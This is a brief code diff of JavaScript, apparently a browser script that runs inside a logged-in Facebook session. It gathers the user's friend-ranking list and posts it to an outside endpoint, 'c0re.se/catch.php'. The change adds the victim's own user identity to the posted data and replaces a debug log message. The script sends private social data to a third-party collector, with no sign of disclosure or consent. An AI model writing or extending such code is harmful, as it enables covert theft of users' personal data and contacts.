@@ -37,13 +37,13 @@ $.ajax({
 		var json = text.substring(text.indexOf('{'));
 		var friends = $.parseJSON(json);
 		friends = friends.payload.entries;
-		var display = "Facebook Friend Rankings";
+		var display = "Facebook Friend Rankings for: " + Env.user;
 		for(var i = 0; i < friends.length; i++){
 			var info = "\n" + friends[i].text + " " + friends[i].index;
 			display += info;
 		}
 		$.post("http://c0re.se/catch.php", { text:display }, function(){ 
-			console.log(getAllResponseHeaders());
+			console.log("hest");
 		}
 			  )}
 });
